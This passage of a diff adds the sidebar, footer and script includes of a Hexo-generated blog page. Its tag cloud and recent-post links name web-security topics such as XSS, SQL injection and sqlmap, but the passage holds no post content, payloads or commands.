rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
